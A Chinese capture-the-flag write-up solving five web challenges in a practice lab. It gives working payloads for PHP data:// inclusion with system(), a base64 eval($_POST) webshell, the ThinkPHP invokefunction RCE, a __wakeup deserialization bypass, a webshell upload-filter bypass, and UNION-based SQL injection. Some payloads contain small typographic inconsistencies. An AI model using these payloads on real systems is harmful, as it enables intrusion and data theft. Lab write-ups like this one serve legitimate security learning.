# 1.Web_php_include

本题为php文件包含,打开后发现php://被过滤,所以想到用data伪协议

方法一

```
/?page=data://text/plain,<?php system(“ls”); ?>  # 爆出本目录文件

/?page=data://text/plain,<?php system(“cat fl4gisisish3r3.php”); ?>
# 获取flag
```

方法二

```
<?php eval($_POST[123]); ?> # 进行base64编码得到
PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7ID8+

/?page=data://text/plain;base64, PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7ID8+
```

```python
import base64
text = '<?php eval($_POST[123]); ?>'
text = base64.b64encode(text.encode())
print(text)
```

用蚁剑连接,密码manwhatcanisay,在目录中找到flag文件

# 2.php_rce

结合靶机内容可以知道是ThinkPHP的rce漏洞,到github找POC

```php
/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

正常回显,说明具有远程命令执行漏洞,将id替换为**ls ../../../../**发现根目录下有flag,替换为cat ../../../../flag可得到flag

# 3.unserialize3

题目提示为反序列化,观察发现xctf类有一个成员变量flag属性为111,那么原始的序列化为:

O:4:”xctf”:1:{S:4:”flag”;S:3:”111”;}

构造的payload为:

O:4:”xctf”:2:{S:4:”flag”;S:3:”111”;} 传入属性多于对象属性个数绕过__wakeup()得到flag

# 4.upload1

题目提示是文件上传漏洞,那么就需要上传木马

方法一:禁用JS,上传一句话木马,用蚁剑连接找到flag文件

方法二:用BurpSuite抓包,发现JS过滤的代码,分析发现只允许png和jpg通过。将一句话木马改名为1.png，上传时抓包，将文件名字改为1.php，成功上传后用蚁剑连接一句话木马，找到flag

# 5.NewsCenter

打开靶机网页后发现有搜索框，试着注入1’ and 1=1#,发现有回显,说明有注入点

1’ order by 3#说明有三列  1’ union select 1,2,3# 2,3有回显

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()# 爆表名

1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name = “secret_table”# 爆字段名

1’ union select group_concat(fl4g) from secret_table#  查询flag